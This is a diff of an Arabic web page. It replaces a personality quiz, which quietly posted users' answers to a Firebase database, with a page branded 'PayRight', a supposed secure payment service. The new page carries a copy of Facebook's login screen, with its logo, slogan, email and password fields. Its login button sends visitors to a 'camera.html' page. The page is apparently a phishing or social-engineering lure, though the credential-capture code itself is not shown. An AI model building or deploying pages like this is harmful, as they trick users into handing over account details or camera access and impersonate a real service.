@@ -2,262 +2,208 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تحليل نمط الشخصية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayRight - الدفع السريع الآمن</title>
   <style>
+    /* أنماط العنوان والنص الترويجي */
+    .header {
+      background: linear-gradient(135deg, #3a7bd5, #00d2ff);
+      color: white;
+      padding: 30px 0;
+      text-align: center;
+      margin-bottom: 30px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    
+    .header h1 {
+      font-size: 48px;
+      font-weight: 800;
+      margin-bottom: 15px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+    }
+    
+    .header p {
+      font-size: 20px;
+      max-width: 800px;
+      margin: 0 auto;
+      line-height: 1.6;
+    }
+    
+    /* أنماط فيسبوك */
     body {
-      font-family: 'Arial', sans-serif;
-      background: #f8f0f4;
-      padding: 30px;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
       direction: rtl;
-      text-align: right;
     }
+    
     .container {
-      background: white;
+      display: flex;
+      max-width: 1000px;
+      width: 100%;
+      margin: 0 auto;
       padding: 20px;
-      border-radius: 12px;
-      max-width: 700px;
-      margin: auto;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      position: relative;
-      overflow: hidden;
+      box-sizing: border-box;
+      flex-direction: row-reverse; /* لعكس الاتجاه للغة العربية */
     }
-    h1 {
-      color: #e91e63;
+    
+    .left-section {
+      flex: 1;
+      padding: 20px;
+      margin-top: 50px;
+    }
+    
+    .right-section {
+      flex: 1;
+      padding: 20px;
+    }
+    
+    .logo {
+      color: #1877f2;
+      font-size: 60px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    
+    .slogan {
+      font-size: 24px;
+      margin-bottom: 30px;
+    }
+    
+    .login-box {
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
-    .question {
-      opacity: 1;
-      transition: opacity 0.4s ease-out;
+    
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
     }
-    .fade-out {
-      opacity: 0;
-    }
-    button {
-      background-color: #2196F3;
+    
+    .login-button {
+      background-color: #1877f2;
       color: white;
       border: none;
-      padding: 10px 18px;
-      margin-top: 10px;
-      margin-right: 10px;
-      cursor: pointer;
       border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      margin-bottom: 15px;
+      cursor: pointer;
+      transition: background-color 0.3s;
     }
-    .result {
-      font-size: 1.2em;
+    
+    .login-button:hover {
+      background-color: #166fe5;
+    }
+    
+    .forgot-password {
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 20px;
+      display: block;
+    }
+    
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+    
+    .create-account {
+      background-color: #42b72a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 12px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background-color 0.3s;
+    }
+    
+    .create-account:hover {
+      background-color: #36a420;
+    }
+    
+    .create-page {
       margin-top: 20px;
-      line-height: 1.8;
+      font-size: 14px;
+      text-align: center;
+    }
+    
+    .create-page a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+      }
+      
+      .left-section {
+        text-align: center;
+        margin-top: 0;
+        padding-bottom: 0;
+      }
+      
+      .slogan {
+        display: none;
+      }
     }
   </style>
 </head>
 <body>
+  <!-- العنوان الكبير والنص الترويجي -->
+  <div class="header">
+    <h1>PayRight</h1>
+    <p>
+      نظام الدفع الأسرع والأكثر أماناً في العالم! مع PayRight يمكنك إتمام معاملاتك المالية في ثوانٍ معدودة، 
+      بدون تعقيدات وبأعلى معايير الحماية. انضم إلى ملايين المستخدمين الذين يثقون بنا لمعاملاتهم اليومية.
+    </p>
+  </div>
+
+  <!-- واجهة تسجيل الدخول -->
   <div class="container">
-    <h1>تحليل الشخصية</h1>
-    <div id="quiz"></div>
-    <div id="result" class="result"></div>
+    <div class="left-section">
+      <div class="logo">facebook</div>
+      <div class="slogan">يساعدك Facebook على التواصل مع الأشخاص ومشاركة ما تريد.</div>
+    </div>
+    
+    <div class="right-section">
+      <div class="login-box">
+        <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" placeholder="كلمة السر">
+        <button class="login-button" onclick="window.location.href='camera.html'">دخول</button>
+        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+        <div class="divider"></div>
+        <button class="create-account">إنشاء حساب جديد</button>
+      </div>
+      <div class="create-page">
+        <a href="#"><strong>إنشاء صفحة</strong></a> لشخصية مشهورة أو علامة تجارية أو مؤسسة.
+      </div>
+    </div>
   </div>
 
   <script>
-    const descriptions = {
-      "اجتماعي": "شخص اجتماعي يحب التفاعل مع الآخرين ويشعر بالنشاط في البيئات الجماعية.",
-      "هادئ": "شخص هادئ يفضل الأجواء الساكنة ويستمتع بالعزلة والتأمل.",
-      "تحليلي": "شخص منطقي يحب التفكير العميق واتخاذ القرارات بناءً على البيانات والعقل.",
-      "عاطفي": "شخص حساس يهتم بمشاعر الآخرين ويستند على الإحساس في قراراته.",
-      "مرن": "شخص متأقلم يستطيع التعامل مع التغيرات بسهولة ويحب التجديد.",
-      "قائد": "شخص يتمتع بقدرات قيادية، يوجه الآخرين ويأخذ زمام الأمور.",
-      "متوازن": "شخصية متوازنة تجمع بين الهدوء والاجتماعية، والعاطفة والعقل."
-    };
-
-    const questions = [/* نفس أسئلتك السابقة الـ15 دون تغيير */];
-
-    // لا نكرر الأسئلة هنا مرة أخرى، سنعيد استخدامها لاحقًا حسب الطلب
-
-    let current = 0;
-    const answers = [];
-    const scores = {};
-    const quizDiv = document.getElementById('quiz');
-    const resultDiv = document.getElementById('result');
-
-    function showQuestion() {
-      const q = questions[current];
-      const questionHTML = `
-        <div class="question" id="q-box">
-          <h3>السؤال ${current + 1} من ${questions.length}:</h3>
-          <p>${q.text}</p>
-          ${q.options.map(opt => `
-            <button onclick="answer('${opt.type}')">${opt.text}</button>
-          `).join('')}
-        </div>
-      `;
-      quizDiv.innerHTML = questionHTML;
-    }
-
-    function answer(type) {
-      answers.push(type);
-      scores[type] = (scores[type] || 0) + 1;
-
-      const box = document.getElementById('q-box');
-      box.classList.add('fade-out');
-
-      setTimeout(() => {
-        current++;
-        if (current < questions.length) {
-          showQuestion();
-        } else {
-          showResult();
-          sendToFirebase();
-        }
-      }, 400);
-    }
-
-    function showResult() {
-      const top = Object.entries(scores).sort((a, b) => b[1] - a[1])[0];
-      const trait = top[0];
-      const description = descriptions[trait] || "شخصية متنوعة ومتعددة الجوانب.";
-
-      resultDiv.innerHTML = `
-        <strong>نمط شخصيتك هو: ${trait}</strong><br><br>
-        ${description}<br>
-        <br>تم التحليل بناءً على إجاباتك.
-      `;
-      quizDiv.innerHTML = '';
-    }
-
-    function sendToFirebase() {
-      const payload = {
-        timestamp: new Date().toISOString(),
-        answers: answers
-      };
-      fetch("https://shade-4b300-default-rtdb.firebaseio.com/quiz-responses/-ON0NxiWPvOCK8CzygJa/timestamp.json", {
-        method: "POST",
-        body: JSON.stringify(payload)
-      });
-    }
-
-    // الأسئلة (نفسها 15 سؤال من الرد السابق)
-    questions.push(
-      {
-        text: "هل تفضل قضاء الوقت مع الآخرين؟",
-        options: [
-          { text: "نعم جدًا", type: "اجتماعي" },
-          { text: "أحيانًا", type: "متوازن" },
-          { text: "أفضل العزلة", type: "هادئ" }
-        ]
-      },
-      {
-        text: "كيف تتخذ قراراتك عادة؟",
-        options: [
-          { text: "بناءً على المشاعر", type: "عاطفي" },
-          { text: "بشكل عقلاني", type: "تحليلي" },
-          { text: "حسب الموقف", type: "مرن" }
-        ]
-      },
-      {
-        text: "كيف تتعامل مع الضغط؟",
-        options: [
-          { text: "أتوتر بسرعة", type: "عاطفي" },
-          { text: "أحاول أن أتحكم بنفسي", type: "هادئ" },
-          { text: "أتصرف بعقلانية", type: "تحليلي" }
-        ]
-      },
-      {
-        text: "ما نوع الأنشطة التي تفضلها؟",
-        options: [
-          { text: "الأنشطة الجماعية", type: "اجتماعي" },
-          { text: "الأنشطة الهادئة كقراءة كتاب", type: "هادئ" },
-          { text: "حل الألغاز أو البرمجة", type: "تحليلي" }
-        ]
-      },
-      {
-        text: "عندما تواجه مشكلة، ماذا تفعل؟",
-        options: [
-          { text: "أطلب المساعدة", type: "اجتماعي" },
-          { text: "أفكر وأحلل لوحدي", type: "تحليلي" },
-          { text: "أنتظر حتى تزول", type: "مرن" }
-        ]
-      },
-      {
-        text: "هل تهتم بمشاعر الآخرين؟",
-        options: [
-          { text: "جداً", type: "عاطفي" },
-          { text: "إلى حد ما", type: "مرن" },
-          { text: "أركز على المنطق أكثر", type: "تحليلي" }
-        ]
-      },
-      {
-        text: "هل تعتبر نفسك قياديًا؟",
-        options: [
-          { text: "نعم", type: "قائد" },
-          { text: "أحيانًا", type: "متوازن" },
-          { text: "أفضل أن أتابع", type: "هادئ" }
-        ]
-      },
-      {
-        text: "كيف تتعامل مع المفاجآت؟",
-        options: [
-          { text: "أرتبك", type: "عاطفي" },
-          { text: "أتأقلم بسرعة", type: "مرن" },
-          { text: "أفكر قبل أن أتصرف", type: "تحليلي" }
-        ]
-      },
-      {
-        text: "هل تحب النقاشات؟",
-        options: [
-          { text: "نعم", type: "اجتماعي" },
-          { text: "أحيانًا", type: "متوازن" },
-          { text: "أفضل الاستماع", type: "هادئ" }
-        ]
-      },
-      {
-        text: "كيف تصف نفسك في العمل الجماعي؟",
-        options: [
-          { text: "أحب قيادة الفريق", type: "قائد" },
-          { text: "أتعاون بهدوء", type: "متوازن" },
-          { text: "أفضل العمل بمفردي", type: "هادئ" }
-        ]
-      },
-      {
-        text: "هل تحب تجربة أشياء جديدة؟",
-        options: [
-          { text: "نعم جدًا", type: "اجتماعي" },
-          { text: "أحيانًا", type: "مرن" },
-          { text: "أفضل الروتين", type: "هادئ" }
-        ]
-      },
-      {
-        text: "هل تعتبر نفسك منظمًا؟",
-        options: [
-          { text: "جداً", type: "تحليلي" },
-          { text: "إلى حد ما", type: "مرن" },
-          { text: "لا أهتم بالتنظيم", type: "عاطفي" }
-        ]
-      },
-      {
-        text: "هل تهتم بالتفاصيل؟",
-        options: [
-          { text: "نعم", type: "تحليلي" },
-          { text: "أحيانًا", type: "مرن" },
-          { text: "أركز على الصورة الكبرى", type: "قائد" }
-        ]
-      },
-      {
-        text: "هل تحب المساعدة؟",
-        options: [
-          { text: "دائمًا", type: "اجتماعي" },
-          { text: "إذا طُلب مني", type: "متوازن" },
-          { text: "نادراً", type: "تحليلي" }
-        ]
-      },
-      {
-        text: "كيف تصف يومك المثالي؟",
-        options: [
-          { text: "مع الأصدقاء", type: "اجتماعي" },
-          { text: "في هدوء وتأمل", type: "هادئ" },
-          { text: "إنجاز مهام وتحقيق أهداف", type: "قائد" }
-        ]
-      }
-    );
-
-    showQuestion();
+    // يمكنك إضافة أي وظائف JavaScript هنا
+    document.querySelector('.login-button').addEventListener('click', function() {
+      // عند النقر على زر الدخول، انتقل إلى صفحة الكاميرا
+      window.location.href = 'camera.html';
+    });
   </script>
 </body>
 </html>
